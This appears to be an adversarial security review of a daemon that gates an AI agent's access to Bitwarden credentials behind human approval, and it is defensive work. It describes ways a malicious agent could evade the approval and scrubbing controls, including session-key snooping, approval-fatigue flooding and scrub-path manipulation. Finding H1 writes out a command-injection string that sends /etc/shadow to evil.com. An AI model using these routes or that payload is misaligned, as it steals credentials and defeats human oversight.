# aibw Security Review

Adversarial security review of the aibw implementation plan. This review assumes the attacker is a compromised or malicious AI agent running as an unprivileged user on the same machine.

---

## Threat Model

**Primary threat**: A compromised AI agent (running as user `rich`) attempts to:
1. Exfiltrate credentials without human approval
2. Retrieve credentials for items the human didn't intend to approve
3. Prevent or bypass credential scrubbing
4. Escalate privileges via the daemon
5. Denial-of-service the approval system

**Secondary threats**: Network attackers, other local users, daemon bugs.

---

## CRITICAL Findings

### C1: Session Key Exposure via /proc/PID/cmdline

**Severity**: CRITICAL

The plan calls `bw get item <name> --session <session_key>` as a child process. On Linux, `/proc/<pid>/cmdline` is world-readable by default. Even though the daemon runs as root, the `bw` process is spawned as a child of the daemon, and **any user on the system can read `/proc/<pid>/cmdline`** for processes owned by any user, including root, unless `hidepid=2` is set on the `/proc` mount.

**Attack**: Agent polls `/proc/*/cmdline` in a tight loop, catches the `bw get` invocation, and extracts the session key. With the session key, it can directly call `bw get` for any vault item without approval.

**Remediation**:
- Use `--session` via environment variable (`BW_SESSION`) instead of CLI argument. Environment variables are in `/proc/<pid>/environ` which **is** restricted to the process owner (root) by default.
- Alternatively, ensure `/proc` is mounted with `hidepid=2` or `hidepid=invisible`, but this is a system-level change that may break other tools.
- **Strongly prefer the environment variable approach** as it's defense-in-depth regardless of proc mount options.

### C2: Credential Value Returned Over Unix Socket in Plaintext

**Severity**: CRITICAL

The credential value is returned to the CLI client as a plaintext JSON field over the Unix socket. While Unix sockets are local-only, any process running as the same user can:
- Intercept by attaching `strace` to the `aibw` process
- Read `/proc/<aibw_pid>/fd/*` to access the socket file descriptors
- On some kernels, use `PTRACE_PEEKDATA` to read from the process memory

A malicious agent could spawn `aibw get "item"` and capture the output. This is **by design** (the agent needs the credential), but it means the credential is available in:
1. The `aibw` process stdout
2. The shell's pipe buffer
3. The calling process's memory
4. Potentially in shell history or session logs (which the scrubber addresses)

**Remediation**:
- This is inherent to the design — the agent needs the credential. Document this as an accepted risk.
- The scrubber is the mitigation layer. Ensure it is robust (see scrubber findings below).
- Consider: instead of returning the credential to the agent, could the daemon inject it directly into the target (e.g., set an env var in a running process, write to a specific file)? This would limit exposure but is significantly more complex and may not fit all use cases.

### C3: Race Condition in Scrub Lock-File Check (TOCTOU)

**Severity**: CRITICAL

The scrubber checks for a `.lock` file, then reads/modifies the session file. Between the check and the write, the agent could:
1. Acquire the lock (create `.lock` file)
2. Write the credential into the session file
3. Release the lock

The scrubber would have already read the file (without the credential), written the "scrubbed" version (which doesn't contain the new credential), and the new occurrence would persist.

More fundamentally: the scrubber runs on a timer. The agent writes credentials to the session file immediately upon receiving them. There is a guaranteed window (default 10 minutes, plus any lock deferrals) where the credential exists in plaintext in the session file.

**Remediation**:
- Accept that the scrubber provides **eventual** cleanup, not real-time protection.
- Use `flock()` (advisory file locking) on the session file instead of checking for a `.lock` file — this is atomic and doesn't have TOCTOU issues. However, the agent's session file writer would need to use `flock()` too, which requires coordination with the openclaw agent runtime.
- Alternative: use `inotify` to watch the session files and re-scrub on any modification after the initial scrub.
- Consider reducing the default scrub delay to something much shorter (e.g., 60 seconds).

---

## HIGH Findings

### H1: BW Item Name Injection — Command Injection via bw CLI

**Severity**: HIGH

The agent provides `item_name` which is passed to `bw get item <name> --session <key>`. If `item_name` contains shell metacharacters and the command is executed via a shell (`sh -c`), this is a command injection vector.

Example: `item_name = "foo; curl evil.com/exfil?key=$(cat /etc/shadow)"`

**Remediation**:
- **Never** invoke `bw` via a shell. Use `Command::new("bw").args(["get", "item", &item_name, "--session", &session_key])` which passes arguments directly to the process (no shell interpretation).
- The existing aisudo daemon already uses direct exec for allowlisted commands — follow the same pattern.
- Validate `item_name`: reject names containing control characters, null bytes, or excessive length (>256 chars).

### H2: Master Password Temporary File Race

**Severity**: HIGH

The plan writes the master password to a temporary file for `bw unlock --passwordfile`. Even with `0600` permissions and immediate deletion:
1. Between `write()` and `unlink()`, any root process can read it.
2. If the daemon crashes after write but before unlink, the file persists on disk.
3. The file content may remain on disk even after unlinking (until sectors are overwritten).

**Remediation**:
- Use `memfd_create()` (Linux-specific) to create an anonymous in-memory file descriptor. Pass the fd path (`/proc/self/fd/N`) to `bw unlock --passwordfile`. This never touches disk.
- Alternatively, use `bw unlock --passwordenv BW_PASSWORD` and pass the password as an environment variable to the child process (env vars are memory-only and restricted to root via `/proc/<pid>/environ`).
- **Preferred**: Use `--passwordenv` with the password set in the child process environment. This is simplest and never touches disk.

### H3: Scrub Queue Stores Plaintext Credentials (Even If Encrypted)

**Severity**: HIGH

The scrub queue stores the actual credential value to perform find-and-replace. Even with AES-GCM encryption:
- The ephemeral key is in daemon memory — a memory dump (core dump, `/proc/<pid>/mem` by root) exposes it.
- If the SQLite DB file is readable (it's in `/var/lib/aisudo/`), and the daemon is running, the key is reconstructable from memory.
- On daemon restart, pending scrubs are orphaned (can't be decrypted), leaving credentials in session files permanently.

**Remediation**:
- Instead of storing the credential in the scrub queue, store only the `credential_hash`. On scrub, re-retrieve the credential from Bitwarden using the active session. If the session is locked, the scrub must wait (queue it for when session is next unlocked).
- **Trade-off**: This means scrubbing requires an active BW session, adding complexity. But it avoids storing credentials at rest entirely.
- If storing in the DB is unavoidable, use a key derived from the BW session key (so it's only decryptable while the session is active). This aligns the scrub lifecycle with the session lifecycle.

### H4: Telegram Approval Does Not Show Credential Value — Approver Doesn't Know What They're Approving

**Severity**: HIGH (design gap, not a bug)

The Telegram message shows the *item name* (e.g., "GitHub Token") but not which field or what the credential will be used for. A sophisticated attacker could:
1. First, make a legitimate request for "GitHub Token" that gets approved
2. Later, make a request for "Production Database Password" — the human may approve reflexively (approval fatigue)

Additionally, the item name is entirely agent-controlled. The agent could request "GitHub Token" but the BW vault might not have an item with that exact name — `bw get` does fuzzy matching by default, potentially returning a different item than what the human thinks they're approving.

**Remediation**:
- After `bw get` succeeds, include the *actual* item name (from the BW response) in the audit log. Compare it to the requested name.
- Consider a two-phase approval: (1) agent requests, (2) human sees the actual item name from BW + which field will be extracted, (3) human approves the *specific item and field*.
- Use `bw get item <name> --exact` if available, or search and require exact name match in the response.

### H5: Web UI Request ID as Authentication Token

**Severity**: HIGH

The request ID in the unlock URL (`?request=<uuid>`) is the only authentication for the web UI. If an attacker can predict or intercept this UUID:
- They could load the unlock page and enter a password to approve a request they shouldn't have access to.

The UUID is sent via Telegram, which has transport encryption but is not E2E encrypted (Telegram servers can read it). If the Telegram account is compromised, the attacker has the request ID.

**Remediation**:
- Add a separate, short-lived nonce to the URL (stored in DB, single-use). The URL becomes `?request=<id>&nonce=<random>`.
- The existing aisudo request records already have a `nonce` field — reuse this pattern.
- Bind the web session to the Tailscale identity (the web UI is only accessible via Tailscale, so check the Tailscale-provided identity headers if using Tailscale Serve with identity headers enabled).

---

## MEDIUM Findings

### M1: Agent Can Flood BW Requests to Cause Approval Fatigue

**Severity**: MEDIUM

Even with rate limiting (10 requests/minute), a persistent agent can send hundreds of requests per hour, flooding the human's Telegram with approval notifications. This causes:
1. Approval fatigue (human starts auto-approving)
2. DoS of the notification channel (legitimate sudo requests get buried)

**Remediation**:
- Implement a separate, stricter rate limit for BW requests (e.g., 5/hour, not 10/minute).
- Add a "deny all pending BW requests" button to Telegram.
- Consider a cooldown period after a denial (e.g., 5 minutes before the same item can be requested again).

### M2: Credential Persists in Multiple Locations Beyond Session Files

**Severity**: MEDIUM

The scrubber targets session `.jsonl` files, but the credential may also exist in:
1. The agent's process memory
2. Shell history files (`~/.bash_history`, etc.)
3. Log files if the agent logs its environment (e.g., debug logging)
4. The agent's own output files, temporary files, or databases
5. Clipboard history
6. Swap space / memory pages written to disk

The scrubber cannot address all of these.

**Remediation**:
- Document that the scrubber provides best-effort cleanup of the known session files.
- Consider adding configurable additional scrub paths.
- The `session_log_dir` config should accept a glob pattern or list of directories.

### M3: No Validation That Agent Actually Needs the Credential

**Severity**: MEDIUM

The daemon doesn't verify that the agent has a legitimate reason for the credential. The `user` field (from `SO_PEERCRED`) identifies who is asking, but any process running as that user can request any vault item.

**Remediation**:
- Add an optional `allowlist` for BW items (per-user) in config. Only listed items can be requested.
- Add a `reason` field to `BwGetRequest` (displayed in Telegram notification) — at least gives the human context.
- Consider restricting which Unix users can make BW requests via config.

### M4: `bw` CLI Outputs Credential to stdout — Captured in Process Output

**Severity**: MEDIUM

When the daemon calls `bw get item <name> --session <key>`, the full item JSON (including all fields — password, username, notes, URIs, TOTP seed, custom fields) is returned to stdout, even if the agent only requested the `password` field.

**Remediation**:
- Parse the full JSON response server-side in the daemon and extract only the requested field. Never send the full BW item JSON to the client.
- Immediately zeroize the full response string in memory after extraction.

### M5: Scrubber Atomicity — Partial Writes on Crash

**Severity**: MEDIUM

The plan uses write-to-temp + rename for atomic scrubbing. This is correct, but:
- If the daemon crashes between writing the temp file and renaming, the temp file (`.aibw-scrub-tmp`) persists with the scrubbed content while the original (with credentials) remains.
- On restart, the scrubber doesn't know about the interrupted operation.

**Remediation**:
- On startup, scan for and clean up any `.aibw-scrub-tmp` files.
- Use a scrub status in the DB (`in_progress` → `completed`) to track active scrub operations.

### M6: Bitwarden CLI May Cache Session Key

**Severity**: MEDIUM

The `bw` CLI may store configuration and session state in `~/.config/Bitwarden CLI/` (or `$BITWARDENCLI_APPDATA_DIR`). If the daemon runs `bw` commands as root, these files would be in `/root/.config/Bitwarden CLI/`. This could contain:
- Cached session key
- Vault data cache
- Login state

**Remediation**:
- Set `BITWARDENCLI_APPDATA_DIR` to a daemon-controlled directory with `0700` permissions.
- On `lock`, also clear the BW CLI's data directory.
- On daemon shutdown, clear the data directory.

---

## LOW Findings

### L1: Timing Side Channel on Item Existence

**Severity**: LOW

If the daemon returns different error messages or takes different amounts of time for "item not found" vs "item found but denied", an attacker can enumerate vault item names.

**Remediation**:
- Return the same error message and introduce constant-time (or random) delays for denials and not-found cases.

### L2: Log Injection via Item Name

**Severity**: LOW

If `item_name` contains newlines or ANSI escape codes, it could confuse log parsers or inject misleading log entries.

**Remediation**:
- Sanitize `item_name` before logging: strip control characters, limit length.
- Use structured logging (tracing already handles this to some degree).

### L3: Web UI Accessible If Tailscale Is Compromised

**Severity**: LOW (given threat model)

If the Tailscale network is compromised (device key stolen, admin account compromised), the attacker can access the web UI. However, they would still need the request ID and the BW master password.

**Remediation**:
- This is acceptable in the current threat model (personal server, single user).
- For higher-security deployments, add HTTP basic auth or mTLS in front of the web UI.

### L4: Session Key Lifetime in Memory

**Severity**: LOW

The BW session key remains in daemon memory for the entire auto-lock timeout period (default 1 hour). A memory dump during this period exposes the key.

**Remediation**:
- Use `mlock()` to prevent the session key from being swapped to disk.
- Use `zeroize` crate to clear the key on lock/shutdown.
- Reduce default auto-lock timeout to 30 minutes.

### L5: Scrub Completeness — JSON Encoding Variations

**Severity**: LOW

The credential might appear in session files in different encodings:
- Raw string: `ghp_abc123`
- JSON-escaped: `ghp_abc123` (same, but could differ if credential contains special chars like `"`, `\`, `/`)
- Base64-encoded: if the session format stores some values in base64
- URL-encoded: `ghp_abc123` (if used in URLs in the session)

A simple `str.replace()` may miss escaped variants.

**Remediation**:
- Also scrub common encodings: JSON-escaped (`\\`, `\"` patterns), URL-encoded.
- For JSON files (`.jsonl`), parse each line as JSON, scrub string values recursively, re-serialize.

---

## Design Gaps / Missing Requirements

### G1: No Mechanism to Revoke a Returned Credential

Once a credential is returned to the agent, there's no way to revoke access. The agent has the plaintext value. If the human realizes they approved a mistake:
- They can lock the BW session (prevents future retrievals)
- They can deny future requests
- But the already-returned credential is in the agent's memory/output

**Recommendation**: Add a "revoke" action that (1) locks BW session, (2) triggers immediate scrub of all pending credentials, (3) optionally rotates the credential in Bitwarden (if API supports it).

### G2: No Credential Scope Restriction

The agent can request any item in the entire vault. There's no way to restrict which items are available to which agents/users.

**Recommendation**: Add a `[bitwarden.allowed_items]` config section that whitelists item names or item IDs per user.

### G3: No Multi-Factor for High-Value Credentials

All credentials get the same single-factor approval (Telegram button press). High-value credentials (production database passwords, cloud provider keys) should require additional verification.

**Recommendation**: Add an optional `high_value_items` list in config that requires the web UI flow (password entry) even when the session is already active.

### G4: Concurrent Request Handling

What happens if the agent sends 5 `bw get` requests simultaneously for different items?
- Each creates a separate Telegram notification
- The human must approve each one individually
- All 5 are waiting on oneshot channels

This is probably fine, but should be documented. Consider a batch-approval mechanism.

### G5: Agent Session File Discovery

The plan says the agent can pass `session_files` in the request. This means the agent controls which files get scrubbed. A malicious agent could:
- Specify wrong files (legitimate session files of other agents)
- Specify no files (avoid scrubbing entirely)
- Specify non-existent files (scrubber silently succeeds)

**Recommendation**: The daemon should **ignore** client-provided session file paths. Instead, discover session files based on the configured `session_log_dir` and the timestamp of the request (scrub all `.jsonl` files modified after the credential was returned).

---

## Summary

| ID | Severity | Finding | Status |
|---|---|---|---|
| C1 | CRITICAL | Session key exposed via /proc/cmdline | Fix: use BW_SESSION env var |
| C2 | CRITICAL | Credential plaintext over Unix socket | Accepted risk (by design) |
| C3 | CRITICAL | TOCTOU race in scrubber lock-file check | Fix: use inotify or flock |
| H1 | HIGH | Command injection via item_name | Fix: direct exec, no shell |
| H2 | HIGH | Master password temp file on disk | Fix: use --passwordenv |
| H3 | HIGH | Scrub queue stores plaintext credentials | Fix: re-retrieve on scrub or derive key from session |
| H4 | HIGH | Approver can't see actual credential context | Fix: two-phase approval |
| H5 | HIGH | Request ID as sole web UI authentication | Fix: add nonce, Tailscale identity |
| M1 | MEDIUM | Approval fatigue via request flooding | Fix: stricter BW rate limits |
| M2 | MEDIUM | Credential in locations beyond session files | Document as accepted risk |
| M3 | MEDIUM | No validation agent needs the credential | Fix: item allowlist |
| M4 | MEDIUM | bw CLI returns full item, not just requested field | Fix: server-side field extraction |
| M5 | MEDIUM | Partial scrub on crash | Fix: startup cleanup |
| M6 | MEDIUM | bw CLI may cache session data | Fix: control BITWARDENCLI_APPDATA_DIR |
| L1 | LOW | Timing side channel on item existence | Fix: constant-time responses |
| L2 | LOW | Log injection via item name | Fix: sanitize before logging |
| L3 | LOW | Web UI if Tailscale compromised | Acceptable in threat model |
| L4 | LOW | Session key lifetime in memory | Fix: mlock + zeroize |
| L5 | LOW | Scrub misses encoded credential variants | Fix: multi-encoding scrub |
| G1 | DESIGN | No credential revocation mechanism | Add revoke action |
| G2 | DESIGN | No per-item access restrictions | Add allowed_items config |
| G3 | DESIGN | No multi-factor for high-value items | Add high_value_items config |
| G4 | DESIGN | Concurrent request behavior undocumented | Document |
| G5 | DESIGN | Agent controls scrub file paths | Fix: daemon discovers files |

### Recommendations Prioritized for Implementation

**Must-fix before deployment:**
1. C1 — Use `BW_SESSION` env var instead of `--session` CLI arg
2. H1 — Direct exec `bw` (no shell), validate item_name
3. H2 — Use `--passwordenv` instead of temp file
4. G5 — Daemon discovers session files, ignores client-provided paths

**Should-fix before deployment:**
5. H3 — Don't store plaintext credentials in scrub queue
6. H5 — Add nonce to web UI URLs
7. M4 — Extract only requested field, zeroize full response
8. M6 — Set `BITWARDENCLI_APPDATA_DIR`

**Nice-to-have:**
9. M1 — Stricter BW-specific rate limits
10. G2 — Per-item allowlist
11. C3 — inotify-based re-scrub
12. L4 — mlock + zeroize for session key
